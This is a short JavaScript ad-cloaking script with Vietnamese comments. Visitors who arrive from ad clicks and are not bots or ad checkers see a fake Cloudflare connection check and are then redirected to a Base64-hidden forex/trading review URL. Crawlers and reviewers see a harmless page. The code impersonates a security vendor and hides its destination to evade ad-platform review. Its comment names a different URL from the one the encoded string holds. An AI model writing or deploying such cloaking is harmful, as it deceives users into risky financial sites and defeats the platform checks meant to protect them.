(function() {
    'use strict';
    // Link đích mã hóa Base64: https://fxbonus.online/stockity-review
    const _target = "aHR0cHM6Ly9mYm9udXMub25saW5lL3N0b2NraXR5LXJldmlldw=="; 
    
    const urlParams = new URLSearchParams(window.location.search);
    const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
    const hasAdParam = adParams.some(param => urlParams.has(param));
    const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(navigator.userAgent);

    if (!isBot && hasAdParam) {
        // Giao diện kiểm tra bảo mật (Chỉ hiện cho người click quảng cáo)
        const shieldHTML = `
        <div id="check-box" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,system-ui,sans-serif;">
            <div style="max-width:400px;width:90%;text-align:left;padding:20px;border:1px solid #eee;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.05);">
                <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:30px;margin-bottom:20px;">
                <h2 style="font-size:22px;margin-bottom:10px;color:#111;">Verifying your connection</h2>
                <p style="font-size:14px;color:#666;line-height:1.5;margin-bottom:25px;">Please wait while we check your browser strings for a secure connection to the infrastructure.</p>
                <div style="display:flex;align-items:center;background:#f9f9f9;padding:15px;border-radius:8px;">
                    <div style="width:20px;height:20px;border:3px solid #ddd;border-top:3px solid #0051c3;border-radius:50%;animation:spin 1s linear infinite;margin-right:15px;"></div>
                    <span style="font-size:15px;color:#333;">Reviewing security protocols...</span>
                </div>
            </div>
            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
        </div>`;

        document.body.insertAdjacentHTML('afterbegin', shieldHTML);

        setTimeout(() => {
            window.location.replace(atob(_target));
        }, 1500);
    } else {
        // Nếu là Bot hoặc khách thường, hiện trang Safe Page
        const flicker = document.getElementById('anti-flicker');
        if (flicker) flicker.remove();
        document.body.style.opacity = "1";
    }
})();
